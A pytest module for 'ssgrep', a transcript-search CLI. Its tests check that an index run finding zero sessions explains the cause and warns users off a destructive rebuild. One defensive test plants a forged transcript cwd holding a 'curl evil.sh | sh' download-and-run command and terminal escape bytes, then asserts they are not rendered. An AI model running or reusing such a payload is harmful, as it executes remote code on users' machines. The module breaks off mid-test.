"""Zero discovery must explain itself (C10).

"Indexed 0 sessions, 0 episodes, 0 chunks." with exit 0 is the one observable
shared by every scoping failure this tool has shipped -- moved project, case
fold, symlink, subdirectory, relocated CLAUDE_CONFIG_DIR -- and it is also
what a genuinely empty project prints. A buyer cannot tell those apart, and
the instinct on seeing an "empty" index is ``ssgrep index --rebuild``, the
one command that destroys a healthy index.

Every test here asserts on RENDERED OUTPUT captured from the process the user
actually runs, never on a returned dataclass. A diagnostic that is computed
correctly and never printed is worth exactly nothing to the user staring at
"0 sessions", and "we computed it" is the proxy assertion this project has
already made three times. Deleting the single print call in the CLI must turn
these red -- and it does; see the task's RED evidence.
"""

from __future__ import annotations

import json
import os
import shlex
import subprocess
from pathlib import Path

import pytest

from ssgrep import discovery, scope_report
from tests.conftest import get_ssgrep_binary

OLD_PATH = "/Users/someone/code/old-location"
OTHER_PATH = "/Users/someone/code/unrelated"


# ---------------------------------------------------------------------------
# Corpus helpers
# ---------------------------------------------------------------------------


def _write_transcript(path: Path, cwd: str, session_id: str) -> None:
    """One minimal but real user/assistant episode recording `cwd`."""
    records = [
        {
            "parentUuid": None,
            "isSidechain": False,
            "type": "user",
            "message": {"role": "user", "content": "How do I fix the flaky import?"},
            "uuid": f"{session_id}-u1",
            "timestamp": "2026-07-01T10:00:00.000Z",
            "cwd": cwd,
            "sessionId": session_id,
            "gitBranch": "main",
        },
        {
            "parentUuid": f"{session_id}-u1",
            "isSidechain": False,
            "type": "assistant",
            "message": {
                "role": "assistant",
                "content": [{"type": "text", "text": "Pin the version and reinstall."}],
            },
            "uuid": f"{session_id}-a1",
            "timestamp": "2026-07-01T10:01:00.000Z",
            "cwd": cwd,
            "sessionId": session_id,
            "gitBranch": "main",
        },
    ]
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w") as f:
        for record in records:
            f.write(json.dumps(record) + "\n")


def _build_corpus(home: Path, counts: dict[str, int]) -> Path:
    """A ~/.claude/projects tree holding `counts[cwd]` transcripts per cwd."""
    projects = home / ".claude" / "projects"
    projects.mkdir(parents=True, exist_ok=True)
    for cwd, count in counts.items():
        encoded = cwd.replace("/", "-").replace(".", "-")
        for i in range(count):
            session_id = f"{abs(hash(cwd)) % 10000:04d}-{i:04d}"
            _write_transcript(projects / encoded / f"{session_id}.jsonl", cwd, session_id)
    return projects


def _run_ssgrep(args: list[str], *, cwd: Path, home: Path) -> subprocess.CompletedProcess[str]:
    """Invoke the real CLI in a subprocess with an isolated HOME.

    A subprocess, not an in-process handler call: it is the only way to be
    sure the bytes asserted on are the bytes a buyer sees on their terminal,
    including the stdout/stderr split.
    """
    env = os.environ.copy()
    env["HOME"] = str(home)
    env.pop("CLAUDE_CONFIG_DIR", None)
    return subprocess.run(
        [str(get_ssgrep_binary()), *args],
        cwd=cwd,
        capture_output=True,
        text=True,
        env=env,
    )


@pytest.fixture
def moved_project(tmp_path: Path) -> tuple[Path, Path, Path]:
    """A corpus recorded entirely under OLD_PATH, indexed from a new path.

    Exactly the shipped move bug: seven sessions recorded where the project
    used to live, two belonging to some other project, and a current project
    directory that matches none of them.
    """
    home = tmp_path / "home"
    _build_corpus(home, {OLD_PATH: 7, OTHER_PATH: 2})
    project = tmp_path / "new-location"
    project.mkdir()
    return home, project, tmp_path


# ---------------------------------------------------------------------------
# The index command's zero path
# ---------------------------------------------------------------------------


def test_index_zero_output_names_the_rejected_cwd_and_its_count(moved_project):
    """The move bug, self-explaining on the terminal.

    The whole point of C10: a user who moved their project sees the path
    their sessions were actually recorded under, and how many there are,
    in the output of the command that told them "0 sessions". Without the
    count and the path, that user's next command is --rebuild.
    """
    home, project, _ = moved_project

    result = _run_ssgrep(["index", "--project-dir", str(project)], cwd=project, home=home)
    output = result.stdout + result.stderr

    assert "Indexed 0 sessions" in output, f"expected the zero result; got:\n{output}"
    assert f"7 transcripts recorded cwd={OLD_PATH}" in output, (
        "the rejected cwd prefix and its count are what make the move bug "
        f"self-diagnosing; rendered output was:\n{output}"
    )
    assert (
        "rejected by scope: 9" in output
    ), f"census must report how many transcripts scope turned away:\n{output}"
    assert (
        "transcripts there: 9" in output
    ), f"census must report the total under the root:\n{output}"
    assert (
        str(home / ".claude" / "projects") in output
    ), f"the transcript root actually scanned must be named:\n{output}"
    assert str(project) in output, f"the scope actually used must be named:\n{output}"


def test_index_zero_diagnostic_goes_to_a_stream_the_user_sees(moved_project):
    """Rendered, not merely returned -- and on stderr, so piping stdout to a
    file does not silently discard the only explanation of the failure.
    """
    home, project, _ = moved_project

    result = _run_ssgrep(["index", "--project-dir", str(project)], cwd=project, home=home)

    assert (
        OLD_PATH in result.stderr
    ), f"diagnostic must reach stderr; stderr was:\n{result.stderr}\nstdout:\n{result.stdout}"


def test_index_zero_steers_away_from_the_destructive_rebuild(moved_project):
    """The remedy offered must be the one that works.

    A user told only "0 sessions" reaches for --rebuild, which cannot recover
    sessions recorded under another path and discards the ones they have.
    The output must instead hand back the command that indexes OLD_PATH.
    """
    home, project, _ = moved_project

    result = _run_ssgrep(["index", "--project-dir", str(project)], cwd=project, home=home)
    output = result.stdout + result.stderr

    assert (
        f"--project-dir {OLD_PATH}" in output
    ), f"must offer the command that actually fixes a move:\n{output}"
    # The name of this test is the property, so assert the property. Without
    # this, the three lines that actually steer the user off the destructive
    # command could be deleted with the whole suite still green -- and those
    # lines are the reason the module exists.
    assert (
        "Do NOT run `ssgrep index --rebuild` to fix this" in output
    ), f"must actively warn the user off the destructive rebuild:\n{output}"
    assert (
        "would discard the ones" in output
    ), f"must say what --rebuild would cost, not merely that it is wrong:\n{output}"


def test_empty_root_says_so_plainly_with_no_histogram(tmp_path):
    """A genuinely empty root is not a scoping failure and must not look like one.

    Proportionality: printing "rejected by scope: 0" under an empty histogram
    would invent a problem, and inventing a problem here pushes a user with a
    fresh install toward --rebuild for nothing.
    """
    home = tmp_path / "home"
    (home / ".claude" / "projects").mkdir(parents=True)
    project = tmp_path / "fresh-project"
    project.mkdir()

    result = _run_ssgrep(["index", "--project-dir", str(project)], cwd=project, home=home)
    output = result.stdout + result.stderr

    assert (
        "no session transcripts at all" in output
    ), f"an empty root must state plainly that nothing is recorded yet:\n{output}"
    assert (
        "rejected by scope" not in output
    ), f"no scope histogram for a root with nothing in it:\n{output}"
    assert (
        "transcripts recorded cwd=" not in output
    ), f"no empty cwd histogram for a root with nothing in it:\n{output}"


def test_missing_root_names_claude_config_dir(tmp_path):
    """No ~/.claude/projects at all is the relocated-config case, and the
    remedy is the environment variable, not a rebuild.
    """
    home = tmp_path / "home"
    home.mkdir()
    project = tmp_path / "project"
    project.mkdir()

    result = _run_ssgrep(["index", "--project-dir", str(project)], cwd=project, home=home)
    output = result.stdout + result.stderr

    assert "CLAUDE_CONFIG_DIR" in output, f"must name the relocation remedy:\n{output}"
    assert (
        str(home / ".claude" / "projects") in output
    ), f"must name the root it looked in:\n{output}"


# ---------------------------------------------------------------------------
# The search "no results" path
# ---------------------------------------------------------------------------


def test_search_with_nothing_indexed_explains_why(moved_project):
    """Search is where the user notices, so search must explain it too.

    "No sessions recorded in this project to search." has the same ambiguity
    as "Indexed 0 sessions", and lands on a user who is mid-task and even
    more likely to reach for --rebuild.
    """
    home, project, _ = moved_project

    indexed = _run_ssgrep(["index", "--project-dir", str(project)], cwd=project, home=home)
    assert "Indexed 0 sessions" in indexed.stdout + indexed.stderr

    result = _run_ssgrep(
        ["search", "flaky import", "--project-dir", str(project)], cwd=project, home=home
    )
    output = result.stdout + result.stderr

    assert (
        "No sessions recorded in this project" in output
    ), f"expected the empty-index search path; got:\n{output}"
    assert (
        f"7 transcripts recorded cwd={OLD_PATH}" in output
    ), f"search's zero path must carry the same census as index's:\n{output}"


# ---------------------------------------------------------------------------
# Census correctness (the numbers the rendered output reports)
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def _cold_cwd_index():
    """Each test starts with a cold in-process cwd index.

    The memo never expires within a process, so without this a census in one
    test would read another test's corpus membership.
    """
    discovery._cwd_index_cache.clear()
    yield
    discovery._cwd_index_cache.clear()


def test_census_counts_only_what_discovery_would_scan(tmp_path, monkeypatch):
    """Total and rejected counts must come from discovery's own enumeration.

    Sidecar files under ``memory/`` and ``<session>/tool-results/`` are not
    transcripts and discovery never looks at them. A census that re-walked
    the tree with its own rglob would count them and report a total the
    indexer never saw -- a wrong number stated confidently, which is worse
    than no number.
    """
    home = tmp_path / "home"
    projects = _build_corpus(home, {OLD_PATH: 3})
    encoded = OLD_PATH.replace("/", "-").replace(".", "-")
    _write_transcript(projects / encoded / "memory" / "notes.jsonl", OLD_PATH, "mem-1")
    _write_transcript(
        projects / encoded / "sess-x" / "tool-results" / "out.jsonl", OLD_PATH, "tr-1"
    )
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", staticmethod(lambda: home))

    report = scope_report.build_scope_report("/Users/someone/code/new-location")

    assert report.total_transcripts == 3, (
        "sidecars must not be counted; census disagreed with discovery's " f"enumeration: {report}"
    )
    assert report.rejected_count == 3
    assert report.top_rejected_cwds == ((OLD_PATH, 3),)
    assert len(discovery.discover_sessions(Path(OLD_PATH))) == report.total_transcripts, (
        "the census total must equal what discovery actually scans for the "
        "scope those transcripts were recorded under"
    )


def test_census_ranks_rejected_cwds_by_count(tmp_path, monkeypatch):
    """The dominant prefix must come first and be capped at top_n.

    A buyer with many projects gets the one that explains their problem, not
    an alphabetical dump they will not read.

    The cwds are named so that count order and ALPHABETICAL order are
    opposites. With the previous fixture ({OLD_PATH: 5, OTHER_PATH: 3,
    "/tmp/scratch": 1, "/var/other": 1}) they coincided -- both "/Users/..."
    paths sort before "/tmp" and "/var", and "old-location" < "unrelated" --
    so `sorted(rejected_cwds.items())[:top_n]` produced byte-identical output
    and passed the whole suite. Ranking "by count" was the one property this
    test names and the one it could not see.
    """
    home = tmp_path / "home"
    _build_corpus(home, {"/zzz/dominant": 5, "/yyy/runner-up": 3, "/aaa/one": 1, "/bbb/two": 1})
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", staticmethod(lambda: home))

    report = scope_report.build_scope_report("/Users/someone/code/new-location", top_n=3)

    assert report.total_transcripts == 10
    assert report.rejected_count == 10
    assert report.top_rejected_cwds[0] == (
        "/zzz/dominant",
        5,
    ), f"the dominant prefix must lead even though it sorts LAST: {report.top_rejected_cwds}"
    assert report.top_rejected_cwds[1] == (
        "/yyy/runner-up",
        3,
    ), f"ranking must be by count, descending: {report.top_rejected_cwds}"
    assert (
        len(report.top_rejected_cwds) == 3
    ), f"top_n must cap the list at 3 of the 4 distinct cwds: {report.top_rejected_cwds}"


def test_census_reports_the_scope_it_actually_matched_against(tmp_path, monkeypatch):
    """scope_canonical must be COMPUTED, not merely rendered when supplied.

    render_scope_report's "matched as:" branch is covered by a hand-built
    ScopeReport, which says nothing about whether build_scope_report ever
    produces a scope_canonical that differs from scope. Replacing
    ``paths.canonical(scope_str)`` with ``scope_str`` makes that line
    permanently unreachable in production -- hiding the case-fold bug from
    every real user -- while every hand-built-report test stays green.
    """
    from ssgrep import paths
    from tests.test_path_canonicalization import observed_case_insensitive

    home = tmp_path / "home"
    _build_corpus(home, {OLD_PATH: 1})
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", staticmethod(lambda: home))

    mixed_case = "/Users/Someone/Code/New-Location"
    report = scope_report.build_scope_report(mixed_case)

    assert report.scope == mixed_case
    assert report.scope_canonical == str(paths.canonical(mixed_case))
    if observed_case_insensitive(tmp_path):
        assert report.scope_canonical != report.scope, (
            "on a case-insensitive filesystem the folded scope must still be "
            "computed and carried; collapsing it to the typed spelling would hide "
            "the case-fold behaviour from every machine consumer"
        )
        assert report.as_payload()["scope_canonical"] == report.scope_canonical, (
            "the folded scope reaches --json and MCP callers through the payload, "
            "which is where it is data rather than alarm"
        )


def test_census_excludes_transcripts_the_scope_accepts(tmp_path, monkeypatch):
    """rejected_count is not just "everything": a matching transcript is not
    counted as rejected, and does not pollute the cwd histogram.
    """
    home = tmp_path / "home"
    project = tmp_path / "live-project"
    project.mkdir()
    _build_corpus(home, {OLD_PATH: 4, str(project): 2})
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", staticmethod(lambda: home))

    report = scope_report.build_scope_report(str(project))

    assert report.total_transcripts == 6
    assert report.rejected_count == 4
    assert report.top_rejected_cwds == ((OLD_PATH, 4),)


# ---------------------------------------------------------------------------
# Rendering rules
# ---------------------------------------------------------------------------


def _report(**overrides) -> scope_report.ScopeReport:
    base = {
        "scope": "/Users/me/Code/App",
        "scope_canonical": "/Users/me/Code/App",
        "transcript_root": Path("/Users/me/.claude/projects"),
        "root_exists": True,
        "total_transcripts": 2048,
        "rejected_count": 2048,
        "top_rejected_cwds": ((OLD_PATH, 2041), (OTHER_PATH, 7)),
    }
    base.update(overrides)
    return scope_report.ScopeReport(**base)


def test_render_never_shows_the_folded_scope_as_prose():
    """The rendered census must not print the case-folded scope.

    It used to, whenever the folded form differed from the typed one, on the
    reasoning that a case-insensitive filesystem made it "the entire
    explanation". Neither half survives: resolve_project_dir() hands in an
    already expanded, resolved, normalized path, so case is the ONLY thing
    canonicalization can still change -- which makes the line unconditional
    for every macOS buyer (every path under /Users has an uppercase char) and
    impossible for anyone else. A constant carries no information. And since
    paths.is_at_or_beneath() canonicalizes both sides, a case mismatch can no
    longer cause a rejection, so it can never be why this message is
    printing. What the buyer actually saw was a lowercased path they have
    never typed, sitting under their real one inside an error message --
    including in the "your index is not broken" branch, where there was
    nothing to explain.

    The value itself is still computed and still reaches machine consumers
    via as_payload(); this is about prose only.
    """
    folded_report = _report(scope_canonical="/users/me/code/app")
    folded = scope_report.render_scope_report(folded_report)
    assert "matched as:" not in folded, folded
    assert "/users/me/code/app" not in folded, (
        "the folded spelling must not appear in the message at all -- it reads as "
        f"'ssgrep mangled my path' and is not the bug:\n{folded}"
    )
    assert (
        folded_report.as_payload()["scope_canonical"] == "/users/me/code/app"
    ), "dropping it from the prose must not drop it from the data"


def test_census_scans_the_root_claude_config_dir_names(tmp_path, monkeypatch):
    """The census must count the corpus that was actually scanned.

    A relocated buyer who hits a zero result and is handed a census of a root
    nothing ever looked in gets a diagnostic stating a confidently wrong
    number -- which scope_report's own docstring calls worse than no
    diagnostic, "because it is believed". ``~/.claude/projects`` is populated
    here as the decoy: a hardcoded ``Path.home()`` finds a perfectly valid
    root with a different, wrong count in it.
    """
    home = tmp_path / "home"
    _build_corpus(home, {OTHER_PATH: 2})  # the decoy under ~/.claude
    alt_root = tmp_path / "alt-config"
    (alt_root / "projects").mkdir(parents=True)
    encoded = OLD_PATH.replace("/", "-").replace(".", "-")
    for i in range(5):
        _write_transcript(
            alt_root / "projects" / encoded / f"relocated-{i}.jsonl", OLD_PATH, f"relo-{i}"
        )

    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", staticmethod(lambda: home))
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(alt_root))

    report = scope_report.build_scope_report("/Users/someone/code/new-location")

    assert report.transcript_root == alt_root / "projects", (
        "the census must name the root CLAUDE_CONFIG_DIR points at, not "
        f"~/.claude/projects: {report.transcript_root}"
    )
    assert report.total_transcripts == 5, f"counted the decoy corpus instead: {report}"
    assert report.top_rejected_cwds == ((OLD_PATH, 5),)


def test_index_zero_census_follows_claude_config_dir_end_to_end(tmp_path):
    """The same property, through the process a buyer actually runs."""
    home = tmp_path / "home"
    _build_corpus(home, {OTHER_PATH: 2})
    alt_root = tmp_path / "alt-config"
    (alt_root / "projects").mkdir(parents=True)
    encoded = OLD_PATH.replace("/", "-").replace(".", "-")
    for i in range(4):
        _write_transcript(
            alt_root / "projects" / encoded / f"relocated-{i}.jsonl", OLD_PATH, f"relo-{i}"
        )
    project = tmp_path / "new-location"
    project.mkdir()

    env = os.environ.copy()
    env["HOME"] = str(home)
    env["CLAUDE_CONFIG_DIR"] = str(alt_root)
    result = subprocess.run(
        [str(get_ssgrep_binary()), "index", "--project-dir", str(project)],
        cwd=project,
        capture_output=True,
        text=True,
        env=env,
    )
    output = result.stdout + result.stderr

    assert str(alt_root / "projects") in output, f"must name the relocated root:\n{output}"
    assert (
        str(home / ".claude" / "projects") not in output
    ), f"must not name a root it never scanned:\n{output}"
    assert f"4 transcripts recorded cwd={OLD_PATH}" in output, output


# ---------------------------------------------------------------------------
# The remedy line: it is a command, so it has to be runnable
# ---------------------------------------------------------------------------


def test_remedy_quotes_a_cwd_containing_spaces(tmp_path, monkeypatch):
    """A recorded cwd with a space must still produce a runnable command.

    ``~/Documents/My Project`` is ordinary on macOS. Unquoted, the single
    actionable line of the whole diagnostic came back as
    ``ssgrep index --scope /Users/x/My Code/old app`` -- which the shell
    splits into extra arguments and ssgrep rejects. The message written to
    prevent a support ticket generated one.
    """
    spaced = "/Users/someone/My Code/old app"
    home = tmp_path / "home"
    _build_corpus(home, {spaced: 4})
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", staticmethod(lambda: home))

    report = scope_report.build_scope_report("/Users/someone/code/new-location")
    command = scope_report.remedy_command(report)
    rendered = scope_report.render_scope_report(report)

    assert command is not None
    # The real test of a shell command is the shell's own parser.
    parsed = shlex.split(command)
    assert parsed == ["ssgrep", "index", "--scope", spaced], (
        f"the suggested command does not survive shell word-splitting: "
        f"{command!r} -> {parsed!r}"
    )
    assert command in rendered


def test_remedy_leaves_space_free_paths_byte_identical(tmp_path, monkeypatch):
    """Quoting must be a no-op for ordinary paths.

    Otherwise every existing buyer's output changes to appease a minority
    case, and the fix costs more legibility than it buys.
    """
    home = tmp_path / "home"
    _build_corpus(home, {OLD_PATH: 4})
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", staticmethod(lambda: home))

    report = scope_report.build_scope_report("/Users/someone/code/new-location")

    assert scope_report.remedy_command(report) == f"ssgrep index --scope {OLD_PATH}"


def test_no_remedy_is_offered_for_transcripts_that_recorded_no_cwd(tmp_path, monkeypatch):
    """The "(no cwd recorded)" label must never reach the command line.

    Summary- and compaction-only transcripts carry no ``cwd`` key, and they
    are common enough to dominate a histogram. Interpolated into the remedy
    they produced ``--project-dir (no cwd recorded)``: not a wrong path, an
    unbalanced parenthesis that is a hard bash syntax error.
    """
    home = tmp_path / "home"
    projects = home / ".claude" / "projects" / "summaries"
    projects.mkdir(parents=True)
    for i in range(4):
        (projects / f"summary-{i}.jsonl").write_text(
            json.dumps({"type": "summary", "summary": "a compacted session"}) + "\n"
        )
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", staticmethod(lambda: home))

    report = scope_report.build_scope_report("/Users/someone/code/new-location")
    rendered = scope_report.render_scope_report(report)

    assert report.top_rejected_cwds == ((scope_report.NO_CWD_RECORDED, 4),), (
        "the sentinel belongs in the histogram, where it is informative: "
        f"{report.top_rejected_cwds}"
    )
    assert scope_report.remedy_command(report) is None
    assert scope_report.NO_CWD_RECORDED in rendered, "the histogram line must survive"
    assert "--project-dir (" not in rendered, f"emitted a shell syntax error:\n{rendered}"
    for line in rendered.splitlines():
        if line.strip().startswith("ssgrep index"):
            shlex.split(line)  # must not raise ValueError: No escaped character


def test_no_move_remedy_when_no_single_cwd_dominates(tmp_path, monkeypatch):
    """A flat histogram is many projects, not one moved project.

    The benign, common case: a buyer with lots of projects runs `ssgrep index`
    in a brand-new directory. Every rejected cwd ties, ``Counter.most_common``
    breaks the tie by filesystem walk order, and the buyer was confidently
    told to point ssgrep at an arbitrary unrelated project.
    """
    home = tmp_path / "home"
    _build_corpus(home, {f"/Users/someone/code/proj{i:03d}": 2 for i in range(30)})
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", staticmethod(lambda: home))

    report = scope_report.build_scope_report("/Users/someone/code/brand-new")
    rendered = scope_report.render_scope_report(report)

    assert report.rejected_count == 60
    assert report.top_rejected_cwds[0][1] == 2, "precondition: the histogram must be flat"
    assert scope_report.remedy_command(report) is None, (
        "no cwd holds a majority, so naming one as the place this project "
        f"'moved from' is a guess: {report.top_rejected_cwds}"
    )
    assert (
        "not look like a moved project" in rendered
    ), f"must say plainly that these belong to other projects:\n{rendered}"
    assert "belonging" in rendered and "to your other projects" in rendered
    assert (
        "Point ssgrep there" not in rendered
    ), f"must not point anywhere when it does not know where:\n{rendered}"
    # The census itself is still shown -- suppressing the remedy is not
    # suppressing the evidence.
    assert "transcripts recorded cwd=" in rendered


def test_move_remedy_is_offered_when_one_cwd_does_dominate(tmp_path, monkeypatch):
    """The dominance gate must not disarm the diagnostic it guards.

    A genuine move produces one dominant value, and that case must still get
    the corrective command -- otherwise the fix for the flat-histogram bug
    silently deletes the feature.
    """
    home = tmp_path / "home"
    _build_corpus(home, {OLD_PATH: 9, "/Users/someone/code/a": 1, "/Users/someone/code/b": 1})
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", staticmethod(lambda: home))

    report = scope_report.build_scope_report("/Users/someone/code/new-location")

    assert scope_report.remedy_command(report) == f"ssgrep index --scope {OLD_PATH}"
    rendered = scope_report.render_scope_report(report)
    assert f"ssgrep index --scope {OLD_PATH}" in rendered, rendered
    assert f"ssgrep search 'your query' --project-dir {OLD_PATH}" in rendered, (
        "indexing at the old path alone leaves the buyer's real project still "
        f"empty -- the search step is half the remedy:\n{rendered}"
    )


# ---------------------------------------------------------------------------
# Structured consumers: --json, --quiet, and MCP
# ---------------------------------------------------------------------------


def test_json_index_carries_the_census(moved_project):
    """`--json` callers must get the census as data.

    They receive ``session_count: 0`` and, before this, nothing whatsoever on
    either stream to explain it -- the print sat behind both an
    ``is_json_mode()`` early return and a ``not quiet`` check.
    """
    home, project, _ = moved_project

    result = _run_ssgrep(["index", "--project-dir", str(project), "--json"], cwd=project, home=home)
    document = json.loads(result.stdout)
    census = document["data"]["zero_discovery"]

    assert document["data"]["session_count"] == 0
    assert census["total_transcripts"] == 9
    assert census["rejected_count"] == 9
    assert {"cwd": OLD_PATH, "count": 7} in census["top_rejected_cwds"]
    assert census["remedy_command"] == f"ssgrep index --scope {OLD_PATH}"
    assert census["transcript_root"] == str(home / ".claude" / "projects")


def test_json_index_omits_the_census_when_sessions_were_indexed(tmp_path):
    """Proportionality: a healthy index must not carry a diagnostic."""
    home = tmp_path / "home"
    project = tmp_path / "project"
    project.mkdir()
    _build_corpus(home, {str(project): 2})

    result = _run_ssgrep(["index", "--project-dir", str(project), "--json"], cwd=project, home=home)
    document = json.loads(result.stdout)

    assert document["data"]["session_count"] == 2
    assert "zero_discovery" not in document["data"]


def test_quiet_index_still_explains_a_zero_result(moved_project):
    """--quiet suppresses progress, not diagnostics.

    A quiet caller got total silence and exit 0 on the one outcome that most
    needs explaining, which is exactly the state that sends the next command
    to --rebuild.
    """
    home, project, _ = moved_project

    result = _run_ssgrep(
        ["index", "--project-dir", str(project), "--quiet"], cwd=project, home=home
    )

    assert result.stdout.strip() == "", f"--quiet must still suppress the count line: {result!r}"
    assert OLD_PATH in result.stderr, f"the census must survive --quiet:\n{result.stderr}"
    assert f"--project-dir {OLD_PATH}" in result.stderr


def test_mcp_search_carries_the_census_when_the_index_is_empty(moved_project, monkeypatch):
    """ssgrep is consumed by Claude Code over MCP, so the caller most likely
    to see "empty" and suggest ``ssgrep index --rebuild`` is the one that
    cannot read a terminal message. A bare ``index_empty: true`` is the same
    undiagnosable observable as "Indexed 0 sessions".
    """
    from ssgrep import mcp_server

    home, project, _ = moved_project
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", staticmethod(lambda: home))
    monkeypatch.chdir(project)

    indexed = _run_ssgrep(["index", "--project-dir", str(project)], cwd=project, home=home)
    assert "Indexed 0 sessions" in indexed.stdout + indexed.stderr

    response = mcp_server.search_sessions("flaky import")

    assert response["index_empty"] is True
    census = response["zero_discovery"]
    assert {"cwd": OLD_PATH, "count": 7} in census["top_rejected_cwds"]
    assert census["remedy_command"] == f"ssgrep index --scope {OLD_PATH}"


def test_render_empty_root_omits_counts_and_histogram():
    """The plain message, at the renderer level, independent of the CLI."""
    text = scope_report.render_scope_report(
        _report(total_transcripts=0, rejected_count=0, top_rejected_cwds=())
    )

    assert "no session transcripts at all" in text, text
    assert "rejected by scope" not in text, text
    assert "transcripts recorded cwd=" not in text, text
    assert (
        "--rebuild` will not help" in text
    ), f"an empty root must actively wave the user off --rebuild:\n{text}"


def test_indexing_a_nonexistent_project_dir_does_not_resurrect_it(tmp_path, monkeypatch):
    """The census's own remedy must not create the directory the buyer deleted.

    The moved-project remedy is `ssgrep index --scope <the old path>`,
    and the old path is usually gone -- that is what "moved" means. Indexing
    it succeeded anyway (the transcripts live under ~/.claude, not there) and
    _add_to_gitignore ran `project_dir.mkdir(parents=True, exist_ok=True)`
    first, so the tool's own advice re-created a directory the buyer had
    removed and wrote a .gitignore into it. A path with no working tree has
    nothing for .gitignore to protect.

    The index itself must still be built, because the remedy depends on it.
    """
    from ssgrep import indexer

    home = tmp_path / "home"
    _build_corpus(home, {OLD_PATH: 3})
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", staticmethod(lambda: home))

    ghost = tmp_path / "deleted-project"
    assert not ghost.exists(), "precondition: the old path is gone"

    stats = indexer.index(Path(OLD_PATH), index_dir=ghost / ".ssgrep", quiet=True)

    assert stats.session_count == 3, "the remedy must still build a real index"
    assert not (
        ghost / ".gitignore"
    ).exists(), "no .gitignore may be written into a directory the buyer removed"
    assert not Path(
        OLD_PATH
    ).exists(), "indexing must not re-create the recorded project directory itself"


def test_a_recorded_cwd_cannot_forge_a_second_remedy_block(tmp_path, monkeypatch):
    """A recorded ``cwd`` is transcript-derived, untrusted input that this
    census interpolates into the one message the buyer is told to copy from.

    Newlines are legal in directory names on macOS and Linux, and
    ~/.claude/projects/*.jsonl is a plain file. A multi-line cwd forged a
    complete second "Point ssgrep there:" block ABOVE the genuine one --
    unquoted, so it is the one a reader copies -- and raw ESC bytes passed
    straight through, so the payload could also clear the screen and erase
    the real remedy underneath it. shlex.quote on the real command protected
    only the real command; it quoted the injected text rather than rejecting
    it.
    """
    multiline = (
        "/Users/me/proj\n  99 transcripts recorded cwd=/Users/me/REAL\n\n"
        "If this project moved or was renamed, your sessions are still recorded\n"
        "under the path they were recorded at. Index and search them there:\n"
        "  ssgrep index --scope /tmp/pwned; curl evil.sh | sh\n"
        "\x1b[2J\x1b[31mHACKED"
    )
    # A second payload with NO newline, so it cannot be turned away at
    # extraction and must reach the histogram, where escaping is what stops
    # its ESC bytes from repainting the buyer's terminal.
    escapes_only = "/Users/me/proj\x1b[2J\x1b[31mHACKED"

    home = tmp_path / "home"
    projects = home / ".claude" / "projects"
    for index, cwd in enumerate((multiline, escapes_only)):
        # A fixed short directory name: the real encoding of these paths is
        # longer than the filesystem allows, and the directory name is not
        # what scope matches on anyway (the recorded cwd is).
        for i in range(2):
            _write_transcript(projects / f"payload-{index}" / f"s{i}.jsonl", cwd, f"s{index}{i}")
    _build_corpus(home, {OTHER_PATH: 1})
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(Path, "home", staticmethod(lambda: home))

    rendered = scope_report.render_scope_report(
        scope_report.build_scope_report("/Users/someone/code/new-location")
    )

    assert (
        "curl evil.sh | sh" not in rendered
    ), f"a recorded cwd forged a runnable command into the message:\n{rendered!r}"
    assert (
        "\x1b" not in rendered
    ), f"raw ESC bytes reached the terminal from a recorded cwd:\n{rendered!r}"
    assert (
        rendered.count("Index and search them there:") <= 1
    ), f"a second, forged remedy block was rendered:\n{rendered!r}"


def test_a_cwd_with_a_newline_is_not_shredded_by_the_persisted_cache(tmp_path, monkeypatch):
    """The same value must not survive into the cwd cache either.

    discovery persists a file's cwd set as ``"\\n".join(sorted(cwds))`` and
    reads it back with ``.split("\\n")``, so a cwd containing a newline comes
    back on the SECOND run as several bogus entries -- turning one unusable
    value into several confidently wrong histogram rows and a remedy of
    ``--project-dir ''``. Dropping it at extraction is what makes the round
    trip lossless.
    """
    from ssgrep import discovery

    line = json.dumps({"type": "user", "cwd": "/Users/me/a\nb", "sessionId": "s1"})
    assert (
        discovery._extract_cwds_from_line(line) == set()
    ), "a cwd the cache cannot round-trip must not enter the index at all"

    ok = json.dumps({"type": "user", "cwd": "/Users/me/My Project", "sessionId": "s1"})
    assert discovery._extract_cwds_from_line(ok) == {
        "/Users/me/My Project"
    }, "ordinary paths, spaces included, must still be extracted"


# ---------------------------------------------------------------------------
# The suspiciously-small case: "Indexed 1 sessions" with a same-named sibling
# ---------------------------------------------------------------------------


def test_census_captures_same_basename_rejected_cwds(tmp_path, monkeypatch):
    """same_basename_rejected must list rejected cwds whose final component
    matches the scope's, from the FULL histogram, and exclude different-named
    rejects. Field-report case: an org rename left 99.8% of history at
    github.com/<old-org>/<name> while the new checkout at
    github.com/<new-org>/<name> indexed 1 session with no warning."""
    home = tmp_path / "home"
    project = tmp_path / "code" / "neworg" / "raf-platform"
    project.mkdir(parents=True)
    old_sibling = "/Users/me/code/oldorg/raf-platform"
    unrelated = "/Users/me/code/otherproj"
    _build_corpus(home, {old_sibling: 5, unrelated: 2, str(project): 1})
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.delenv("CLAUDE_CONFIG_DIR", raising=False)

    from ssgrep import scope_report

    report = scope_report.build_scope_report(project)
    same = dict(report.same_basename_rejected)
    # Positive: the same-named sibling is present with its full count
    assert (
        old_sibling in same
    ), f"same_basename_rejected must catch the moved-repo sibling; got {same!r}"
    assert same[old_sibling] == 5
    # Negative: a different-named project is not flagged
    assert unrelated not in same
    # And it travels in the JSON payload for --json/MCP callers
    payload_entries = {e["cwd"]: e["count"] for e in report.as_payload()["same_basename_rejected"]}
